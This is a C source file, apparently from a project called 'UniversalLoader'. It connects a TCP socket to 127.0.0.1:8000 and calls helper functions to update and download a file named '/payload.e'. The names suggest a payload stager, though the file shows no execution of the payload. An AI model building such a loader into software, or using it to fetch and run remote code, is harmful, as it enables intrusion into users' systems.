// SPDX-FileCopyrightText: 2025 The UniversalLoader development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

#include "./server.h"
#include <arpa/inet.h> // inet_addr()
#include <fcntl.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUFFER_SIZE 4096
#define SA struct sockaddr
#define PROJECT_NAME "UniversalLoader"

int main() {
  const char *hostname = "127.0.0.1";
  const int port = 8000;
  char *path = calloc(11, sizeof(char));
  strncpy(path, "/payload.e", 11);

  int sockfd;
  struct sockaddr_in servaddr;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  if (sockfd == -1) {
    printf("failed to open new socket\n");

    return 1;
  }

  memset(&servaddr, 0, sizeof(servaddr));

  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = inet_addr(hostname);
  servaddr.sin_port = htons(port);

  if (connect(sockfd, (SA *)&servaddr, sizeof(servaddr)) != 0) {
    printf("failed to connect to the server\n");

    return 1;
  }

  else {
    printf("[connected]\n");
  }

  update_payload(&path);

  downloadPayload(sockfd, path);

  return 0;
}
